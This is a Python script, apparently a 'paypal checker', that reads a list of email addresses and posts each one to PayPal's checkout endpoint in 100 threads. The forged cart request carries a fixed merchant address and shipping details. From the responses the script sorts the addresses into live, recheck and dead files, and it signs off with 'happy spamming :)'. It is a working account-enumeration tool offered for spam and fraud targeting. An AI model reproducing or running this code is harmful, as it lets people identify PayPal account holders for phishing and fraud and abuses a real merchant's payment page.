import os
import requests
import base64
from multiprocessing.dummy import Pool as fucker


#<-----clear start----->
def clear():
    linux = 'clear'
    windows = 'cls'
    os.system([linux, windows][(os.name == 'nt')])
clear()
#<-----clear done----->


#<---------------------main------------->
def pplfucker(email):
	try:
		url = 'https://www.paypal.com/cgi-bin/webscr'
		headers = {'user-agent': 'Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36'}
		data = {'cmd':' _cart ', 
		 'upload':' 1 ', 
		 'business':' indre@robertkalinkin.com ', 
		 'item_name_1':'RK GIFT BOX/1', 
		 'item_number_1':'', 
		 'amount_1':' 81.82', 
		 'quantity_1':' 1', 
		 'weight_1':' 0', 
		 'on0_1':' Size - letters', 
		 'os0_1':' S', 
		 'on1_1':' Color', 
		 'os1_1':' GRY/WH/WH', 
		 'item_name_2':' Shipping, Handling, Discounts & Taxes', 
		 'item_number_2':' ', 
		 'amount_2':' 17.18', 
		 'quantity_2':' 1', 
		 'weight_2':' 0', 
		 'currency_code':' EUR', 
		 'first_name':' James Warner', 
		 'last_name':' ', 
		 'address1':' 3881 Yorkland Dr. NW Apt. 8', 
		 'address2':' ', 
		 'city':' Comstock Park', 
		 'zip':' 49321', 
		 'country':' US', 
		 'address_override':' 0', 
		 'email':email}
		payload = requests.post(url, data=data, headers=headers, timeout=8).text
		if email in payload:
		    print('[email live]' +  '   ' + "=> " + email)
		    pplxlive = open('results/Liveppl.txt', 'a')
		    pplxlive.write(email + '\n')
		    pplxlive.close()
		else:
		    if 'your last action could not be completed' in payload:
				print('[recheck it]' +  '   ' + "=> " + email)
				maybexppl = open('results/Recheckmail.txt', 'a')
				maybexppl.write(email + '\n')
				maybexppl.close()
		    else:
				print('[email dead]' +  '   ' + "=> " + email)
				notxppl = open('results/listOfDead.txt', 'a')
				notxppl.write(email + '\n')
				notxppl.close()    
	except:
		pass
#<---------------------main------------->

#<-----------banner------------------------>

banner = 'ICAgIDogICAgICAgICAgICAgIDogICAgICAgICAgICAgICAgCiAgICA6ICAgICAgICAgICAgICA6ICAgICAgICAgICAgICAgIAogIC8gXyBcICAgICAgICAgICAgOiAgICAgICAgICAgICAgICAKXF9cKF8pL18vICAgICAgICAgIDogICAgICAgICAgICAgICAgCiBfLy8iXFxfICAgICAgICAgICA6ICAgICAgICAgICAgICAgIAogIC8gICBcICAgICAgICAgIC8gXyBcICAgICAgICAgICAgICAKICAgICAgICAgICAgIC0tLS0tLS0tLS0tLS0tLQogICAgICAgICAgICAgOnBheXBhbCAgICAgICA6CiAgICAgICAgICAgICA6ICBjaGVja2VyICAgIDoKICAgICAgICAgICAgIDogICAgICAgICB2MSAgOgogICAgICAgICAgICAgLS0tLS0tLS0tLS0tLS0tCgoJCQkg'
print(base64.b64decode(banner))

#<-----------banner------------------------>


emailx = open(raw_input("leads list :"), 'r').readlines()
se = fucker(100)
se.map(pplfucker, emailx)
se.close()
se.join()

if __name__ == '__main__':
    print("happy spamming :) ")



